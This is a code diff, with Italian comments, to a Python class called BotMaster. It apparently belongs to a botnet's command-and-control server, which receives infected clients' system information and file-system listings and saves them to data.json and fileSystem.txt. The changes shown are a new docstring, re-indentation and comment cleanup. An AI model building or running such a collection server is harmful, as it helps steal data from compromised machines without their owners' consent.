@@ -31,19 +31,24 @@ class BotMaster:
 
 
     def waitForHeader(self, connection):
-            # Il client invia al server la dimensione dei dati raccolti ( da sostituire poi al parametro HEADER per la recv() ).
-            data_dim = 0
-            while data_dim == 0:
-                data_dim = int(connection.recv(1024).decode(FORMAT))
+        """
+        Procedura nella quale il server riceve la dimensione dell'header del pacchetto che conterrà dati rilevanti.
+        :return: None
+        """
 
-            # Il server manderà una riposta del tipo 'ok' al client per confermare la corretta ricevuta della dimensione dei dati.
-            message_received = SUCCESSFUL_RESPONSE
-            # Comunica direttamente sulla socket del client e non tramite la sua.
-            connection.send(message_received.encode(FORMAT))
+        # Il client invia al server la dimensione dei dati raccolti ( da sostituire poi al parametro HEADER per la recv() ).
+        data_dim = 0
+        while data_dim == 0:
+            data_dim = int(connection.recv(1024).decode(FORMAT))
 
-            print("System Information Header dimension received: ", data_dim)
+        # Il server manderà una riposta al client per confermare la corretta ricevuta della dimensione dei dati.
+        message_received = SUCCESSFUL_RESPONSE
+        # Comunica direttamente sulla socket del client.
+        connection.send(message_received.encode(FORMAT))
 
-            return data_dim
+        print("System Information Header dimension received: ", data_dim)
+
+        return data_dim
 
     def waitForClient(self):
         """
@@ -63,12 +68,11 @@ class BotMaster:
             with open('data.json', 'w') as fp:
                 json.dump(dict, fp, indent=4)
 
-            # #######################################################################################################################################
-            # Aspetta il secondo header
+            # Il server aspetta il secondo header, quello relativo al retrieval del file system.
             data_dim = self.waitForHeader(connection)
 
             data = connection.recv(data_dim).decode(FORMAT)
-            with open('fileSystem.txt','w', encoding="utf-8") as fp:
+            with open('fileSystem.txt', 'w', encoding="utf-8") as fp:
                 fp.write(data)
 
             connection.close()
